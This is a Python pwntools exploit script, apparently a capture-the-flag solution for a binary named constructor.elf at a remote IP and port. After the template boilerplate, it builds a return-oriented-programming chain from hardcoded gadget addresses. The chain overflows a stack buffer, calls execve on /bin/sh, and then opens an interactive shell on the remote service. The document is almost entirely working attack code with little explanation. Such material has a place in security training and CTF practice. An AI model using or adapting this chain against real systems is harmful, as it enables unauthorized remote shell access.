#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./constructor.elf --host 109.233.56.90 --port 11634
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./constructor.elf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11634)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

g_rax_0x3b     = 0x40115b
g_pop_rdx      = 0x401156
g_xchg_rdx_rdi = 0x401148
g_xchg_rdx_rsi = 0x40114F
g_syscall      = 0x401142
binsh_ptr      = 0x402004


# rdi ---> /bin/sh\0
# rax  ==  0x3b
# rsi  ==  rdx  == 0
# rip  ==  g_syscall


pl  = b''
pl += b'A'*8              # buf
pl += p64(1)              # rbp  
pl += p64(g_rax_0x3b)     # ret addr 
pl += p64(g_pop_rdx)      # ret addr 2
pl += p64(binsh_ptr)      # rdx
pl += p64(g_xchg_rdx_rdi) # ret addr 3 ; swap(rdx, rdi)
pl += p64(g_pop_rdx)      # ret addr 4
pl += p64(0)              # rdx
pl += p64(g_xchg_rdx_rsi) # ret addr 5; swap(rdx, rsi)
pl += p64(g_pop_rdx)      # ret addr 6
pl += p64(0)              # rdx
pl += p64(g_syscall)      # ret addr 7

io.sendline(pl)
io.interactive()